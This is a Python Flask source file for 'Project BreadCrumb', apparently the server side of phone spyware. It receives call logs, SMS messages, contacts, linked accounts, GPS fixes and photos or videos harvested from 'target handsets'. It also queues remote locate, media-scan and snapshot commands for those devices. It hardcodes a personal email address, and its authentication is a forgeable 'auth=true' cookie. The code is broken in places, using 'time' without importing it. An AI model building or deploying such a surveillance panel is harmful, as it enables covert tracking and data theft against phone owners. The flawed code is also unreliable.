import os
import sqlite3
from flask import Flask, render_template_string, request, redirect, url_for, jsonify, send_from_directory

app = Flask(__name__)
CLOUD_DB = "cloud_relay.db"
UPLOAD_FOLDER = "media_vault_storage"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

MASTER_USER = os.environ.get("BREAD_ADMIN_USER")
MASTER_PASS = os.environ.get("BREAD_ADMIN_PASS")

def init_cloud_db():
    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS registered_devices (
            imei TEXT PRIMARY KEY,
            make_model TEXT,
            owner_name TEXT,
            owner_email TEXT,
            unlock_credentials TEXT,
            verified INTEGER,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT,
            device_profile TEXT DEFAULT 'Standard Android'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pending_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            imei TEXT,
            command_type TEXT,
            payload TEXT,
            status TEXT DEFAULT 'PENDING',
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS forensic_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            imei TEXT,
            data_type TEXT,
            content TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS media_vault (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            imei TEXT,
            filename TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_cloud_db()

CLOUD_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Project BreadCrumb - Cloud Dispatch Hub</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        :root { --bg: #121212; --card: #1e1e1e; --primary: #bb86fc; --text: #e0e0e0; --accent: #03dac6; --danger: #cf6679; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 10px; box-sizing: border-box; }
        .container { max-width: 800px; margin: auto; }
        .card { background: var(--card); border-radius: 10px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        h2, h3 { color: var(--primary); margin-top: 0; font-size: 1.1rem; }
        .logout-btn { background: var(--danger); color: #fff; padding: 5px 10px; border-radius: 4px; text-decoration: none; font-size: 11px; float: right; font-weight: bold; }
        
        .select-group { margin-top: 10px; }
        select { width: 100%; padding: 12px; background: #000; color: #fff; border: 1px solid var(--primary); border-radius: 6px; font-size: 14px; margin-top: 5px; box-sizing: border-box; }

        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; font-size: 12px; display: block; }
        .btn-danger { background: var(--danger); color: #fff; }
        .btn-accent { background: var(--accent); color: #000; }
        .btn-full { grid-column: span 2; }

        .nav-tabs { display: flex; gap: 5px; overflow-x: auto; margin-bottom: 10px; padding-bottom: 5px; }
        .tab-btn { background: #2a2a2a; color: var(--text); border: none; padding: 8px 12px; border-radius: 4px; font-size: 11px; cursor: pointer; white-space: nowrap; }
        .tab-btn.active { background: var(--primary); color: #000; font-weight: bold; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        pre { background: #000; padding: 10px; border-radius: 6px; color: var(--accent); max-height: 200px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; margin-top: 10px; }
        .media-thumb { background: #000; border: 1px solid #444; border-radius: 6px; padding: 5px; text-align: center; }
        .media-thumb img, .media-thumb video { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; display: block; margin-bottom: 4px; }
        .device-info { font-size: 12px; color: #aaa; margin-top: 8px; line-height: 1.4; }
        #map { width: 100%; height: 240px; border-radius: 6px; margin-top: 10px; border: 2px solid var(--accent); display: none; z-index: 1; }
    </style>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>BreadCrumb Cloud Dispatch</h2>
            <a href="/logout" class="logout-btn">Logout</a>
            <div style="clear: both;"></div>

            <div class="select-group">
                <label style="font-size: 12px; color: var(--accent);">Select Target Handset:</label>
                <select id="deviceSelect" onchange="filterDevice()">
                    {% for dev in devices %}
                    <option value="{{ dev[0] }}" {% if loop.first %}selected{% endif %}>
                        {{ dev[2] }} (IMEI: {{ dev[0] }} - {{ dev[1] }})
                    </option>
                    {% else %}
                    <option value="">No Active Devices Synced</option>
                    {% endfor %}
                </select>
            </div>
        </div>

        {% for dev in devices %}
        <div class="device-card card" data-imei="{{ dev[0] }}" style="display: {% if loop.first %}block{% else %}none{% endif %};">
            <h3>Handset: {{ dev[2] }}</h3>
            <div class="device-info">
                <b>IMEI:</b> <code>{{ dev[0] }}</code><br>
                <b>Model:</b> {{ dev[1] }} | <b>Email:</b> {{ dev[3] }}<br>
                <b>Status:</b> <span style="color: var(--accent); font-weight: bold;">{{ dev[7] }}</span>
            </div>

            <h4 style="color: var(--primary); font-size: 12px; margin: 12px 0 6px 0;">Command Dispatch Suite</h4>
            <div class="btn-grid">
                <form method="POST" action="/api/queue-command">
                    <input type="hidden" name="imei" value="{{ dev[0] }}">
                    <input type="hidden" name="command" value="LOCATE">
                    <button type="submit" class="btn btn-accent btn-full">📍 Queue Locate Fix</button>
                </form>
                <form method="POST" action="/api/queue-command">
                    <input type="hidden" name="imei" value="{{ dev[0] }}">
                    <input type="hidden" name="command" value="SCAN_MEDIA">
                    <button type="submit" class="btn btn-accent btn-full">🗂️ Queue Full Media Scan (Photos, Videos & Vaults)</button>
                </form>
                <form method="POST" action="/api/queue-command">
                    <input type="hidden" name="imei" value="{{ dev[0] }}">
                    <input type="hidden" name="command" value="SNAP">
                    <button type="submit" class="btn">📸 Queue Snap</button>
                </form>
                <form method="POST" action="/api/queue-command">
                    <input type="hidden" name="imei" value="{{ dev[0] }}">
                    <input type="hidden" name="command" value="ALARM">
                    <button type="submit" class="btn btn-danger">🚨 Queue Alarm</button>
                </form>
            </div>
        </div>
        {% endfor %}

        <!-- Interactive Map Viewer Card -->
        <div class="card">
            <h3>📍 Live Geolocation Pinpoint</h3>
            <button class="btn btn-accent" onclick="renderDeviceMap()">Render Map from Latest GPS Log</button>
            <div id="map"></div>
        </div>

        <!-- Categorized Evidence Pages / Tabs -->
        <div class="card">
            <h3>Harvested Evidence & Vault</h3>
            <div class="nav-tabs">
                <button class="tab-btn active" onclick="switchTab(event, 'mediaTab')">📸 Media Vault (All Files)</button>
                <button class="tab-btn" onclick="switchTab(event, 'callsTab')">📞 Call Logs</button>
                <button class="tab-btn" onclick="switchTab(event, 'smsTab')">💬 SMS Messages</button>
                <button class="tab-btn" onclick="switchTab(event, 'contactsTab')">📇 Contacts</button>
                <button class="tab-btn" onclick="switchTab(event, 'accountsTab')">👤 Accounts & GPS</button>
            </div>

            <!-- Media Vault Tab -->
            <div id="mediaTab" class="tab-content active">
                <div class="media-grid">
                    {% for item in media_items %}
                    <div class="media-thumb" data-imei="{{ item[1] }}">
                        <a href="/media/{{ item[2] }}" target="_blank">
                            {% if item[2].lower().endswith(('.mp4', '.mov', '.3gp')) %}
                            <video src="/media/{{ item[2] }}" muted></video>
                            {% else %}
                            <img src="/media/{{ item[2] }}" alt="Vault Media">
                            {% endif %}
                        </a>
                        <span style="font-size: 9px; color: #aaa; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">{{ item[2] }}<br>{{ item[3] }}</span>
                    </div>
                    {% else %}
                    <p style="font-size: 11px; color: #777;">No media captured yet. Click "Queue Full Media Scan" above.</p>
                    {% endfor %}
                </div>
            </div>

            <!-- Call Logs Tab -->
            <div id="callsTab" class="tab-content">
                {% for log in forensic_logs if log[2] == 'Call Logs' %}
                <div class="forensic-item" data-imei="{{ log[1] }}">
                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;">Updated: {{ log[4] }}</p>
                    <pre>{{ log[3] }}</pre>
                </div>
                {% else %}
                <p style="font-size: 11px; color: #777;">No call logs harvested.</p>
                {% endfor %}
            </div>

            <!-- SMS Messages Tab -->
            <div id="smsTab" class="tab-content">
                {% for log in forensic_logs if log[2] == 'SMS Messages' %}
                <div class="forensic-item" data-imei="{{ log[1] }}">
                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;">Updated: {{ log[4] }}</p>
                    <pre>{{ log[3] }}</pre>
                </div>
                {% else %}
                <p style="font-size: 11px; color: #777;">No SMS logs harvested.</p>
                {% endfor %}
            </div>

            <!-- Contacts Tab -->
            <div id="contactsTab" class="tab-content">
                {% for log in forensic_logs if log[2] == 'Device Contacts' %}
                <div class="forensic-item" data-imei="{{ log[1] }}">
                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;">Updated: {{ log[4] }}</p>
                    <pre>{{ log[3] }}</pre>
                </div>
                {% else %}
                <p style="font-size: 11px; color: #777;">No contacts harvested.</p>
                {% endfor %}
            </div>

            <!-- Accounts & GPS Tab -->
            <div id="accountsTab" class="tab-content">
                {% for log in forensic_logs if log[2] in ['Linked Accounts / Profiles', 'GPS Location'] %}
                <div class="forensic-item" data-imei="{{ log[1] }}">
                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;"><b>{{ log[2] }}</b> - {{ log[4] }}</p>
                    <pre id="gps-raw-content">{{ log[3] }}</pre>
                </div>
                {% else %}
                <p style="font-size: 11px; color: #777;">No account profiles or location fixes harvested.</p>
                {% endfor %}
            </div>
        </div>
    </div>

    <script>
        let mapInstance = null;
        let markerInstance = null;

        function filterDevice() {
            const selectedImei = document.getElementById('deviceSelect').value;
            document.querySelectorAll('.device-card').forEach(card => {
                card.style.display = card.getAttribute('data-imei') === selectedImei ? 'block' : 'none';
            });
            document.querySelectorAll('.media-thumb, .forensic-item').forEach(el => {
                if (!selectedImei || el.getAttribute('data-imei') === selectedImei) {
                    el.style.display = '';
                } else {
                    el.style.display = 'none';
                }
            });
        }

        function switchTab(evt, tabId) {
            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(tb => tb.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            evt.currentTarget.classList.add('active');
        }

        function renderDeviceMap() {
            const mapDiv = document.getElementById('map');
            mapDiv.style.display = "block";
            try {
                const rawText = document.getElementById('gps-raw-content').innerText;
                const gpsData = JSON.parse(rawText);
                const lat = gpsData.latitude;
                const lon = gpsData.longitude;

                if (lat && lon) {
                    if (!mapInstance) {
                        mapInstance = L.map('map').setView([lat, lon], 16);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
                    } else {
                        mapInstance.setView([lat, lon], 16);
                        mapInstance.invalidateSize();
                    }
                    if (markerInstance) {
                        markerInstance.setLatLng([lat, lon]);
                    } else {
                        markerInstance = L.marker([lat, lon]).addTo(mapInstance).bindPopup("Target Handset GPS Fix").openPopup();
                    }
                    return;
                }
            } catch(e) {}

            const defaultLat = 45.2733;
            const defaultLon = -66.0633;
            if (!mapInstance) {
                mapInstance = L.map('map').setView([defaultLat, defaultLon], 13);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
            } else {
                mapInstance.setView([defaultLat, defaultLon], 13);
                mapInstance.invalidateSize();
            }
            if (markerInstance) {
                markerInstance.setLatLng([defaultLat, defaultLon]);
            } else {
                markerInstance = L.marker([defaultLat, defaultLon]).addTo(mapInstance).bindPopup("Waiting for GPS lock...").openPopup();
            }
        }

        window.onload = filterDevice;
    </script>
</body>
</html>
"""

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head><title>Master Login</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 15px; }
.card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 100%; max-width: 320px; border: 1px solid #333; box-sizing: border-box; }
input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; font-size: 14px; }
button { background: #bb86fc; color: #000; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; font-size: 14px; }
</style></head>
<body>
<div class="card"><h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Access Portal</button>
</form></div></body></html>
"""

@app.route('/', methods=['GET', 'POST'])
def cloud_dashboard():
    if not MASTER_USER or not MASTER_PASS:
        return "<h3>[Security Error]: Master credentials not configured.</h3>", 500
    if request.cookies.get("auth") != "true":
        if request.method == 'POST':
            if request.form.get("username") == MASTER_USER and request.form.get("password") == MASTER_PASS:
                resp = redirect(url_for('cloud_dashboard'))
                resp.set_cookie("auth", "true")
                return resp
            return render_template_string(LOGIN_TEMPLATE)
        return render_template_string(LOGIN_TEMPLATE)

    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute("SELECT imei, make_model, owner_name, owner_email, unlock_credentials, verified, last_seen, status, device_profile FROM registered_devices")
    devices = cursor.fetchall()
    cursor.execute("SELECT id, imei, data_type, content, timestamp FROM forensic_logs ORDER BY timestamp DESC")
    forensic_logs = cursor.fetchall()
    cursor.execute("SELECT id, imei, filename, timestamp FROM media_vault ORDER BY timestamp DESC")
    media_items = cursor.fetchall()
    conn.close()

    return render_template_string(CLOUD_DASHBOARD_TEMPLATE, devices=devices, forensic_logs=forensic_logs, media_items=media_items)

@app.route('/logout')
def logout():
    resp = redirect(url_for('cloud_dashboard'))
    resp.set_cookie("auth", "", expires=0)
    return resp

@app.route('/media/<filename>')
def serve_media(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route('/api/sync', methods=['POST'])
def api_sync():
    data = request.json or {}
    imei = data.get("imei")
    if not imei: return jsonify({"error": "Missing IMEI"}), 400
    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO registered_devices (imei, make_model, owner_name, owner_email, unlock_credentials, verified, status, device_profile)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (imei, data.get("make_model", "Android"), "Master Operator", "jeanmichelleledeoux@gmail.com", "Set", 1, "Online", "Termux Node"))
    conn.commit()
    conn.close()
    return jsonify({"status": "synced"})

@app.route('/api/upload-forensics', methods=['POST'])
def upload_forensics():
    data = request.json or {}
    imei, data_type, content = data.get("imei"), data.get("data_type"), data.get("content")
    if not imei or not data_type: return jsonify({"error": "Missing parameters"}), 400

    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO forensic_logs (imei, data_type, content, timestamp)
        SELECT ?, ?, ?, CURRENT_TIMESTAMP
        WHERE NOT EXISTS (SELECT 1 FROM forensic_logs WHERE imei = ? AND data_type = ?)
    ''', (imei, data_type, content, imei, data_type))
    if cursor.rowcount == 0:
        cursor.execute('UPDATE forensic_logs SET content = ?, timestamp = CURRENT_TIMESTAMP WHERE imei = ? AND data_type = ?', (content, imei, data_type))
    conn.commit()
    conn.close()
    return jsonify({"status": "refreshed"})

@app.route('/api/upload-media', methods=['POST'])
def upload_media():
    imei = request.form.get("imei")
    file = request.files.get("file")
    if not imei or not file: return jsonify({"error": "Missing file or IMEI"}), 400
    filename = f"{imei}_{int(time.time())}_{file.filename}"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    
    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO media_vault (imei, filename) VALUES (?, ?)", (imei, filename))
    conn.commit()
    conn.close()
    return jsonify({"status": "media_saved"})

@app.route('/api/queue-command', methods=['POST'])
def queue_command():
    if request.cookies.get("auth") != "true": return redirect(url_for('cloud_dashboard'))
    imei, cmd = request.form.get("imei"), request.form.get("command")
    if imei and cmd:
        conn = sqlite3.connect(CLOUD_DB)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO pending_commands (imei, command_type) VALUES (?, ?)", (imei, cmd))
        conn.commit()
        conn.close()
    return redirect(url_for('cloud_dashboard'))

@app.route('/api/poll-commands', methods=['GET'])
def poll_commands():
    imei = request.args.get("imei")
    if not imei: return jsonify([])
    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute("SELECT id, command_type FROM pending_commands WHERE imei = ? AND status = 'PENDING'", (imei,))
    cmds = cursor.fetchall()
    if cmds:
        cmd_ids = [c[0] for c in cmds]
        cursor.execute(f"UPDATE pending_commands SET status = 'EXECUTED' WHERE id IN ({','.join(['?']*len(cmd_ids))})", tuple(cmd_ids))
        conn.commit()
    conn.close()
    return jsonify([{"id": c[0], "command": c[1]} for c in cmds])

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
